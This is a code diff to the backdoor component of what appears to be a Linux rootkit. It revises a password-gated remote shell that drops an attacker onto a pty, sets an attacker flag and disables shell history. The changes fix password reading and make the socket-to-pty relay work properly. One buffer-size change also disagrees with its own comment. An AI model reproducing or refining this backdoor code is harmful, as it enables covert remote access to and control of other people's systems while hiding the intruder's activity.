@@ -35,17 +35,28 @@
 static int  check_shell_password(int sock) {
     DEBUG(D_INFO, "check_shell_password() called.");
 
-    char    buffer[sizeof(SHELL_PASSWORD)] = {0};
+    char    buffer[strlen(SHELL_PASSWORD) + 1];
+    char    c = 0;
+    int     i;
 
-    if (read(sock, buffer, sizeof(buffer) - 1) < 0)
-    {
-        DEBUG(D_ERROR, "read(): %s", strerror(errno));
-        return -1;
+    memset(buffer, 0, strlen(SHELL_PASSWORD) + 1);
+
+    for (i = 0; c != '\n' && c != '\r'; i++) {
+        switch (read(sock, &c, 1)) {
+            case -1:
+                DEBUG(D_ERROR, "read(): %s", strerror(errno));
+            case 0:
+                return -1;
+            default:
+                if (i < strlen(SHELL_PASSWORD))
+                    buffer[i] = c;
+        }
     }
 
     DEBUG(D_INFO, "backdoor password = '%s'", buffer);
 
-    if (strncmp(buffer, SHELL_PASSWORD, strlen(SHELL_PASSWORD)) != 0)
+    if (i != strlen(SHELL_PASSWORD) + 1
+        || strncmp(buffer, SHELL_PASSWORD, strlen(SHELL_PASSWORD)) != 0)
         return (-1);
     return (1);
 }
@@ -65,7 +76,11 @@ static int  close_socket(int sock) {
 static void start_interactive_shell(int sock, int *pty, int *tty) {
     DEBUG(D_INFO, "start_interactive_shell() called");
 
+#if DEBUG_LEVEL > 0
+    char * const args[] = {"BEURK_LOGIN_SHELL", "-l", NULL};
+#else
     char * const args[] = {SHELL_TYPE, "-l", NULL};
+#endif
     char * const env[] = {_ENV_IS_ATTACKER, _ENV_NO_HISTFILE, _ENV_XTERM, NULL};
 
     /* close all file descriptors (prevent inheritance) */
@@ -84,7 +99,7 @@ static void start_interactive_shell(int sock, int *pty, int *tty) {
     dup2(*tty, STDOUT_FILENO);
     dup2(*tty, STDERR_FILENO);
 
-    execve(args[0], args, env);
+    execve(SHELL_TYPE, args, env);
     DEBUG(D_ERROR, "failed to execve `%s %s`: %s",
             args[0], args[1], strerror(errno));
 }
@@ -103,6 +118,7 @@ static void shell_loop(int sock, int pty) {
 
     nfds = (sock > pty) ? sock : pty;
 
+    setsid();
     while (1) {
         FD_ZERO(&fds);
         FD_SET(sock, &fds);
@@ -113,11 +129,15 @@ static void shell_loop(int sock, int pty) {
                     strerror(errno));
             exit(1);
         }
+
         if (FD_ISSET(sock, &fds)) {
             memset(&buf, 0, SLOOP_BUF_SIZE);
             if ((res = read(sock, buf, SLOOP_BUF_SIZE)) <= 0) {
-                DEBUG(D_ERROR, "shell_loop(): couldn't read from client: %s",
+                if (res == -1 && errno != EIO)
+                    DEBUG(D_ERROR, "shell_loop(): couldn't read from client: %s",
                         strerror(errno));
+                close(pty);
+                close_socket(sock);
                 exit(1);
             }
             else
@@ -126,12 +146,15 @@ static void shell_loop(int sock, int pty) {
         if (FD_ISSET(pty, &fds)) {
             memset(&buf, 0, SLOOP_BUF_SIZE);
             if ((res = read(pty, buf, SLOOP_BUF_SIZE - 31)) <= 0) {
-                DEBUG(D_ERROR, "shell_loop(): couldn't read from pty: %s",
+                if (res == -1 && errno != EIO)
+                    DEBUG(D_ERROR, "shell_loop(): couldn't read from pty: %s",
                         strerror(errno));
+                close(pty);
+                close_socket(sock);
                 exit(1);
             }
             else
-                write(pty, buf, res);
+                write(sock, buf, res);
         }
     }
 }
@@ -144,7 +167,7 @@ static int  drop_pty_connection(int sock) {
     DEBUG(D_INFO, "drop_pty_connection() called");
 
     int     pty, tty;
-    char    pty_name[5 + 255 + 1]; // "/dev/" + MAX_NAME_SZ + "\0"
+    char    pty_name[4 + 255 + 1]; // "/dev/" + MAX_NAME_SZ + "\0"
 
     /* open a pty and cleanup log entries */
     if (openpty(&pty, &tty, pty_name, NULL, NULL) < 0) {
@@ -174,7 +197,7 @@ static int  drop_pty_connection(int sock) {
         case -1:
             DEBUG(D_ERROR, "fork(): %s", strerror(errno));
         default:
-            close_socket(sock);
+            close(sock);
             close(pty);
             errno = ECONNABORTED;
             return (-1);
@@ -201,7 +224,7 @@ int         drop_shell_backdoor(int sock, struct sockaddr *addr) {
     if (check_shell_password(sock) < 0)
         return (close_socket(sock));
 
-    if (write(sock, SHELL_MOTD, strlen(SHELL_MOTD)) < 0) {
+    if ((dprintf(sock, "\r\n%s\r\n", SHELL_MOTD)) < 0) {
         DEBUG(D_ERROR, "write(): %s", strerror(errno));
         return (close_socket(sock));
     }
